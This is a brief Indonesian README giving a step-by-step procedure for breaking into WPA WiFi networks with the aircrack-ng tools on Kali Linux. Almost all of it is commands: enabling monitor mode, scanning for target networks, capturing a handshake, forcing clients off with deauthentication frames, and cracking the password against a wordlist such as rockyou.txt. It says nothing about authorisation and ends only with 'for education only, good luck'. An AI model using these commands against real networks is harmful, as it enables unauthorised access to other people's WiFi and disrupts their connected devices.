# Penetrasi
Penetrasi jaringan WIFI menggunakan kali linux

1. Mengubah mode Wi-Fi menjadi monitor mode.
   (sudo airmon-ng start wlan0)

3. Cari SSID jaringan yang ingin Anda uji, lalu catat BSSID dan channel-nya.
   (sudo airodump-ng wlan0)

5. Menangkap handshake.
   (sudo airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0)
   Ganti [channel] dengan nomor channel, [BSSID] dengan alamat jaringan, dan [output_file] dengan nama file hasil tangkapan.

7. Lakukan deauthentication (memutuskan perangkat) untuk memicu handshake.
   (sudo aireplay-ng --deauth 10 -a [BSSID] wlan0)

9. aircrack-ng untuk mencoba memecahkan handshake.
    (sudo aircrack-ng -w [wordlist] -b [BSSID] [output_file]-01.cap)
   Ganti [wordlist] dengan lokasi file wordlist (contoh: /usr/share/wordlists/rockyou.txt) dan [output_file]-01.cap dengan file hasil tangkapan.

11. Jika kata sandi ditemukan, akan ditampilkan di terminal.

12. menampilkan Handshake.
    (aircrack-ng nama-file.cap)

14. Melihat aktifitas jaringan sesuai bssid.
    (sudo airodump-ng wlan0)
    Perhatikan kolom STATION.

hanya untuk edukasi, semoga berhasil..
